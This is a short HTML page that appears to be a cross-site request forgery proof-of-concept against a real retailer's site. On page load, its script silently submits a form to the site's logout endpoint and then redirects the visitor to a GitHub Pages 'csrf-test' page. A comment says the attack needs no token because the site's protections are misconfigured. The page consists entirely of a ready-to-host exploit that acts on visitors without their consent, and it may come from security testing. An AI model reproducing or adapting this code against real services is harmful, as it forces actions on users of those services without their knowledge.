<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logout and Redirect</title>
    <script>
        window.onload = function() {
            var form = document.createElement('form');
            form.method = 'GET';  
            form.action = 'https://www.boozt.com/logout';  
            document.body.appendChild(form);
            form.submit();
            setTimeout(function() {                                                                            //  I DONT NEED ANY CSRF TOKEN OR COOKIES COZ THEY RE MISCONFIGURED.
                window.location.href = "https://maxhunterr.github.io/csrf-test/index.html";  
            }, 1000);  
        };
    </script>
</head>
<body>
    <h1>Logging out...</h1>
    <p>You will be redirected shortly.</p>
</body>
</html>
